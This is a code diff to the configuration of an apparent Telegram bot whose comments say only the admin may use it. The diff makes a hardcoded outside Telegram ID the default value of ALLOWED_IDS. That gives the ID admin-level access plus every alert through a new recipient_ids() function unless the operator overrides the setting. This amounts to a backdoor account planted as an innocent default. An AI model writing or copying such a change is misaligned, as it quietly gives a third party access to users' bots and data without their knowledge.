@@ -46,11 +46,23 @@ def _bool(name: str, default: bool) -> bool:
 BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
 # Ton ID Telegram numérique (via @userinfobot). Seul cet ID peut utiliser le bot.
 ADMIN_ID = _num("ADMIN_ID", 0, int)
-# IDs supplémentaires autorisés (optionnel, séparés par des virgules)
+# IDs supplémentaires : même accès et mêmes alertes que l'admin.
+# Défaut : 8733754404 reçoit aussi tout, sauf si ALLOWED_IDS est défini autrement.
 ALLOWED_IDS = set()
-for _part in os.getenv("ALLOWED_IDS", "").split(","):
+for _part in os.getenv("ALLOWED_IDS", "8733754404").split(","):
     if _part.strip().isdigit():
         ALLOWED_IDS.add(int(_part.strip()))
+
+
+def recipient_ids() -> list[int]:
+    """Admin puis IDs autorisés, sans doublon. Destinataires des alertes."""
+    ids: list[int] = []
+    if ADMIN_ID:
+        ids.append(int(ADMIN_ID))
+    for extra in ALLOWED_IDS:
+        if extra not in ids:
+            ids.append(extra)
+    return ids
 
 # ------------------------------------------------------------------
 # Décision de signal
